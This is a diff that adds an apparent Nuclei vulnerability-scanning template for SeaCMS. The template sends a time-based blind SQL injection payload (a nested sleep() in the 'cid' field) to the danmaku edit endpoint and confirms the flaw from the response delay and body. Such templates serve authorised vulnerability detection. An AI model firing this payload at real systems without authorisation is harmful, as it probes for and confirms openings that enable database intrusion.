@@ -1,0 +1,32 @@
+id: poc-yaml-seacms-dmku-sqli
+info:
+  name: SeaCMS SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /js/player/dmplayer/dmku/index.php?ac=edit HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        cid=(select(1)from(select(sleep({{t1}})))x)&text=1&color=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"code":0,"danmuku":"\u5b8c\u6210"'
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
